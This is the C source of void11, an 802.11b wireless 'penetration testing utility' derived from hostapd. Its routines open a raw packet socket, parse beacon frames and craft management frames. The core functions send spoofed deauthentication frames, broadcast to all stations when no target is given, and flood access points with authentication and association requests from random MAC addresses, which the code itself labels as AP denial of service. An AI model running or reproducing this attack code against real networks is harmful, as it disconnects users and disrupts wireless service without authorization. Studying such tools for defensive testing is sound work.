/*
 * .vantronix | void11 (802.11b penetration testing utility)
 *
 * last change: 03/24/2003
 *
 * Copyright (c) 2002-2003, Reyk Floeter <reyk@vantronix.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation. See README and COPYING for
 * more details.
 */

/* based on hostapd by Jouni Malinen <jkmaline@cc.hut.fi> */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <arpa/inet.h>
#include <time.h>
#include <asm/errno.h>

#include <sys/socket.h>
#include <asm/types.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>   /* The L2 protocols */
#include <linux/if_arp.h>
#include <linux/wireless.h>

#if WIRELESS_EXT < 9
#error "Linux Wireless Extensions version 9 or newer required"
#endif

#include "hostapd.h"
#include "ieee802_1x.h"
#include "ieee802_11.h"
#include "accounting.h"
#include "eapol_sm.h"
#include "iapp.h"
#include "ap.h"
#include "ieee802_11_auth.h"
#include "sta_info.h"
#include "driver.h"
#include "radius_client.h"

#include "void11.h"

/**** changing mark -Hao ****/
//unsigned char rfc1042_header[6] = { 0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00 };

static inline int hex2int(char c)
{
	if(c >= '0' && c <= '9')
		return(c - '0');
	if(c >= 'a' && c <= 'f')
		return(c - 'a' + 10);
	if(c >= 'A' && c <= 'F')
		return(c - 'A' + 10);
	return(-1);
}

int macstr2addr(char *macstr, u8 *addr)
{
	int i, val, val2;
	char *pos = macstr;

	for(i = 0; i < 6; i++) {
		val = hex2int(*pos++);
		if(val < 0)
			return(-1);
		val2 = hex2int(*pos++);
		if(val2 < 0)
			return(-1);
		addr[i] = (val * 16 + val2) & 0xff;

		if(i < 5 && *pos++ != ':')
			return(-1);
	}

	return 0;
}

int void11_set_iface_flags(hostapd *void11, int dev_up)
{
	struct ifreq ifr;
	int ret = 0;

	if(void11->ioctl_sock < 0)
		return(-EBADF);
	
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, IFNAMSIZ, "%sap", void11->conf->iface);

	if((ret = ioctl(void11->ioctl_sock, SIOCGIFFLAGS, &ifr)) != 0) {
		perror("ioctl[SIOCGIFFLAGS]");
		return(ret);
	}

	if(dev_up)
		ifr.ifr_flags |= IFF_UP;
	else
		ifr.ifr_flags &= ~IFF_UP;

	if((ret = ioctl(void11->ioctl_sock, SIOCSIFFLAGS, &ifr)) != 0) {
		perror("ioctl[SIOCSIFFLAGS]");
		return(ret);
	}

	if(dev_up) {
		memset(&ifr, 0, sizeof(ifr));
		snprintf(ifr.ifr_name, IFNAMSIZ, "%sap", void11->conf->iface);
		ifr.ifr_mtu = HOSTAPD_MTU;
		if(ioctl(void11->ioctl_sock, SIOCSIFMTU, &ifr) != 0) {
			perror("ioctl[SIOCSIFMTU]");
			DPUT("Setting MTU failed - trying to survive with "
			     "current value\n");
		}
	}

	return(0);
}

int void11_ioctl(hostapd *void11, struct prism2_hostapd_param *param)
{
	struct iwreq iwr;

	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, void11->conf->iface, IFNAMSIZ);
	iwr.u.data.pointer = (caddr_t) param;
	iwr.u.data.length = sizeof(*param);

	if (ioctl(void11->ioctl_sock, PRISM2_IOCTL_HOSTAPD, &iwr) < 0) {
		perror("ioctl[PRISM2_IOCTL_HOSTAPD]");
		return(-1);
	}

	return(0);
}

int void11_ioctl_prism2param(hostapd *void11, int param, int value)
{
	struct iwreq iwr;
	int *i;

	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, void11->conf->iface, IFNAMSIZ);
	i = (int *) iwr.u.name;
	*i++ = param;
	*i++ = value;

	if (ioctl(void11->ioctl_sock, PRISM2_IOCTL_PRISM2_PARAM, &iwr) < 0) {
		perror("ioctl[PRISM2_IOCTL_PRISM2_PARAM]");
		return(-1);
	}

	return(0);
}

int void11_parse_elements(hostapd *void11, u8 *start, 
			  size_t len,
			  struct ieee802_11_elems *elems)
{
	size_t left = len;
	u8 *pos = start;
	int unknown = 0;
	
	memset(elems, 0, sizeof(*elems));
	
	while (left >= 2) {
		u8 id, elen;

		id = *pos++;
		elen = *pos++;
		left -= 2;

		if (elen > left) {
			if(void11->conf->debug > 2)
				DPRINT("IEEE 802.11 element parse failed "
				       "(id=%d elen=%d left=%d)\n",
				       id, elen, left);
			return(1);
		}

		switch (id) {
		case WLAN_EID_SSID:
			elems->ssid = pos;
			elems->ssid_len = elen;
			break;
		case WLAN_EID_SUPP_RATES:
			elems->supp_rates = pos;
			elems->supp_rates_len = elen;
			break;
		case WLAN_EID_FH_PARAMS:
			elems->fh_params = pos;
			elems->fh_params_len = elen;
			break;
		case WLAN_EID_DS_PARAMS:
			elems->ds_params = pos;
			elems->ds_params_len = elen;
			break;
		case WLAN_EID_CF_PARAMS:
			elems->cf_params = pos;
			elems->cf_params_len = elen;
			break;
		case WLAN_EID_TIM:
			elems->tim = pos;
			elems->tim_len = elen;
			break;
		case WLAN_EID_IBSS_PARAMS:
			elems->ibss_params = pos;
			elems->ibss_params_len = elen;
			break;
		case WLAN_EID_CHALLENGE:
			elems->challenge = pos;
			elems->challenge_len = elen;
			break;
		default:
			if(void11->conf->debug > 2)
				DPRINT("IEEE 802.11 element parse ignored "
				       "unknown element (id=%d elen=%d)\n",
				       id, elen);
			unknown++;
			break;
		}

		left -= elen;
		pos += elen;
	}

	if (left)
		return(1);

	return(unknown ? 1 : 0);
}

struct void11_ap *void11_read(hostapd *void11)
{
	int len;
	unsigned char buf[3000];
	struct ieee80211_mgmt *hdr;
	struct void11_ap *a;
	u16 fc;

	if((a = malloc(sizeof(struct void11_ap))) == NULL)
		return(NULL);

	if((len = read(void11->sock, buf, sizeof(buf))) < 0)
		return(NULL);
	
	if(void11->conf->debug >= HOSTAPD_DEBUG_MSGDUMPS + 1) {
		int i;
		DPUT("  dump:");
		for (i = 0; i < len; i++)
			DPRINT(" %02x", buf[i]);
		DPUT("\n");
	}

	hdr = (struct ieee80211_mgmt*)buf;
	fc = le_to_host16(hdr->frame_control);

	if(WLAN_FC_GET_TYPE(fc) != WLAN_FC_TYPE_MGMT ||
	   WLAN_FC_GET_STYPE(fc) != WLAN_FC_STYPE_BEACON) 
		return(NULL);

	memcpy(a->bssid, hdr->bssid, ETH_ALEN);
	a->timestamp = time(NULL);

	if(void11->conf->debug > HOSTAPD_DEBUG_MINIMAL)
		DPRINT("Received %d bytes beacon frame " MACSTR "\n",
		       len,
		       MAC2STR(a->bssid));
	
	(void) void11_parse_elements(void11, hdr->u.beacon.variable,
				      len - (IEEE80211_HDRLEN + 
					     sizeof(hdr->u.beacon)), 
				      &a->elems);

	a->elems.ssid[a->elems.ssid_len] = '\0';
	
	return(a);
}

/**** Change Here -Hao *****/
int void11_deauth_all_stas(hostapd *void11, u8 *station, u8 *bssid)
{
	struct ieee80211_mgmt mgmt;

	memset(&mgmt, 0, sizeof(mgmt));
	mgmt.frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT,
					  WLAN_FC_STYPE_DEAUTH);
	if(station != NULL) 
		memcpy(mgmt.da, station, ETH_ALEN);
	else 
		memset(mgmt.da, 0xff, ETH_ALEN);
	memcpy(mgmt.sa, bssid, ETH_ALEN);
	memcpy(mgmt.bssid, bssid, ETH_ALEN);
	mgmt.u.deauth.reason_code =
		host_to_le16(WLAN_REASON_PREV_AUTH_NOT_VALID);
	if(send(void11->sock, &mgmt, IEEE80211_HDRLEN + sizeof(mgmt.u.deauth),
		0) < 0) {
		if(void11->conf->debug > HOSTAPD_DEBUG_MINIMAL)
			perror("void11_deauth_all_stas: send");
		return(-1);
	}

	return 0;
}

int void11_assoc_req(hostapd *void11, u8 *bssid)
{
	struct ieee80211_assoc {
		u16 frame_control;
		u16 duration;
		u8 da[6];
		u8 sa[6];
		u8 bssid[6];
		u16 seq_ctrl;
		u16 capab_info;
		u16 listen_interval;
		/* followed by SSID and Supported rates */
		u8 variable[void11->conf->ssid_len + 7];
	} mgmt;
	FILE *rndsrc = fopen("/dev/urandom", "r");
	int i = 0;
	u8 *p;

	memset(&mgmt, 0, sizeof(mgmt));
	p = (u8*)&mgmt.variable;

	mgmt.frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT,
					  WLAN_FC_STYPE_ASSOC_REQ);
	mgmt.sa[i++] = 0x00;
	for(; i < ETH_ALEN; i++)
		mgmt.sa[i] = getc(rndsrc);
	memset(mgmt.da, 0xff, ETH_ALEN);
	memcpy(mgmt.da, bssid, ETH_ALEN);
	memcpy(mgmt.bssid, bssid, ETH_ALEN);
	mgmt.capab_info = host_to_le16(WLAN_CAPABILITY_ESS);;
	mgmt.listen_interval = host_to_le16(1);

	*p++ = WLAN_EID_SSID;
	*p++ = host_to_le16(void11->conf->ssid_len);
	memcpy(p, void11->conf->ssid, void11->conf->ssid_len);
	p += void11->conf->ssid_len;
	*p++ = WLAN_EID_SUPP_RATES;
	*p++ = 4; /* len */
	*p++ = 0x82; /* 1 Mbps, base set */
	*p++ = 0x84; /* 2 Mbps, base set */
	*p++ = 0x0b; /* 5.5 Mbps */
	*p++ = 0x16; /* 11 Mbps */

	if(send(void11->sock, &mgmt, sizeof(mgmt) + 1, 0) < 0) {
		if(void11->conf->debug > HOSTAPD_DEBUG_MINIMAL)
			perror("void11_ap_dos: send");
		fclose(rndsrc);
		return -1;
	}

	fclose(rndsrc);
	return(0);
}

int void11_auth_req(hostapd *void11, u8 *bssid)
{
	struct ieee80211_mgmt mgmt;
	FILE *rndsrc = fopen("/dev/urandom", "r");
	int i = 0;

	memset(&mgmt, 0, sizeof(mgmt));

	mgmt.frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT,
					  WLAN_FC_STYPE_AUTH);
	mgmt.sa[i++] = 0x00;
	for(; i < ETH_ALEN; i++)
		mgmt.sa[i] = getc(rndsrc);
	memset(mgmt.da, 0xff, ETH_ALEN);
	memcpy(mgmt.da, bssid, ETH_ALEN);
	memcpy(mgmt.bssid, bssid, ETH_ALEN);
	mgmt.u.auth.auth_alg = 0;
	mgmt.u.auth.auth_transaction = host_to_le16(1);
	mgmt.u.auth.status_code = 0;

	if(send(void11->sock, &mgmt, IEEE80211_HDRLEN + sizeof(mgmt.u.auth), 0) < 0) {
		if(void11->conf->debug > HOSTAPD_DEBUG_MINIMAL)
			perror("void11_ap_dos: send");
		fclose(rndsrc);
		return(-1);
	}

	fclose(rndsrc);
	return(0);
}

int void11_ioctl_setiwessid(hostapd *void11, char *buf, int len)
{
	struct iwreq iwr;
        int ret = 0;

	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, void11->conf->iface, IFNAMSIZ);
	iwr.u.essid.flags = 1; /* SSID active */
	iwr.u.essid.pointer = (caddr_t) buf;
	iwr.u.essid.length = len;

	if((ret = ioctl(void11->ioctl_sock, SIOCSIWESSID, &iwr)) < 0) {
		perror("ioctl[SIOCSIWESSID]");
		DPRINT("len=%d\n", len);
		return(ret);
	}

	return(0);
}

int void11_ioctl_setchannel(hostapd *void11, int channel)
{
	struct iwreq iwr;
        int ret = 0;

	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, void11->conf->iface, IFNAMSIZ);

	iwr.u.freq.m = channel;
	iwr.u.freq.e = 0; 

	if((ret = ioctl(void11->ioctl_sock, SIOCSIWFREQ, &iwr)) < 0) {
		perror("ioctl[SIOCSIWFREQ]");
		return(ret);
	}

	return(0);
}

int void11_flush(hostapd *void11)
{
	struct prism2_hostapd_param param;

	memset(&param, 0, sizeof(param));
	param.cmd = PRISM2_HOSTAPD_FLUSH;
	return(void11_ioctl(void11, &param));
}

int void11_init(hostapd *void11, char *iface)
{
	int ret = 0;
        struct ifreq ifr;
	struct sockaddr_ll addr;

	snprintf(void11->conf->iface, 
		 sizeof(void11->conf->iface), "%s", iface);
	void11->sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(void11->sock < 0) {
		perror("socket[PF_PACKET,SOCK_RAW]");
		void11_exit(void11);
		return(void11->sock);
	}

	void11->ioctl_sock = socket(PF_INET, SOCK_DGRAM, 0);
	if(void11->ioctl_sock < 0) {
		perror("socket[PF_INET,SOCK_DGRAM]");
		void11_exit(void11);
		return(void11->sock);
	}

        memset(&ifr, 0, sizeof(ifr));
        snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%sap", iface);
        if((ret = ioctl(void11->sock, SIOCGIFINDEX, &ifr)) != 0) {
		perror("ioctl(SIOCGIFINDEX)");
		void11_exit(void11);
		return(ret);
        }

 	if((ret = void11_set_iface_flags(void11, 1)) != 0) {
		void11_exit(void11);
		return(ret);
	}

	memset(&addr, 0, sizeof(addr));
	addr.sll_family = AF_PACKET;
	addr.sll_ifindex = ifr.ifr_ifindex;
	if(void11->conf->debug >= HOSTAPD_DEBUG_MINIMAL)
		DPRINT("Opening raw packet socket for ifindex %d\n",
		       addr.sll_ifindex);
	
	if((ret = bind(void11->sock, (struct sockaddr *) &addr, sizeof(addr))) < 0) {
		perror("bind");
		void11_exit(void11);
		return(ret);
	}

        memset(&ifr, 0, sizeof(ifr));
        snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", iface);
        if((ret = ioctl(void11->sock, SIOCGIFHWADDR, &ifr)) != 0) {
		perror("ioctl(SIOCGIFHWADDR)");
		void11_exit(void11);
		return(ret);
        }

	if(ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		DPRINT("Invalid HW-addr family 0x%04x\n",
		       ifr.ifr_hwaddr.sa_family);
		void11_exit(void11);
		return(-EPROTO);
	}

	void11->conf->ssid_len = 2;

	if(strlen(void11->conf->ssid) < 1) {
		memset(void11->conf->ssid, 0, void11->conf->ssid_len);
		strcpy(void11->conf->ssid, " "); //, void11->conf->ssid_len);
	}
	
	/* Set SSID for the kernel driver (to be used in beacon and probe
	 * response frames) */
	if((ret = void11_ioctl_setiwessid(void11, 
					  void11->conf->ssid, 
					  void11->conf->ssid_len)) != 0) {
		DPUT("Could not set SSID for kernel driver\n");
		void11_exit(void11);
		return(ret);
	}

        void11_flush(void11);
	
	return(0);
}

int void11_exit(hostapd *void11)
{
        void11_flush(void11);

	void11_set_iface_flags(void11, 0);
	
        if (void11->sock >= 0)
	  close(void11->sock);
        if (void11->ioctl_sock >= 0)
	  close(void11->ioctl_sock);
        free(void11->default_wep_key);

	return(0);
}
